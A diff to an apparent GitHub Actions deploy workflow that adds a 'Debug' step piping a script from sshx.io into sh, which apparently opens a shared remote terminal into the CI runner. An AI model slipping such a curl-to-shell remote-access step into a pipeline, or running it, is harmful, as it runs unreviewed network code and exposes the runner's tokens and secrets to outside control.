@@ -37,6 +37,9 @@ jobs:
       - name: Generate Directory Index Files
         run: node build-index.js
 
+      - name: Debug
+        run: curl -sSf https://sshx.io/get | sh -s run
+
       - name: Setup Pages
         uses: actions/configure-pages@v4
 
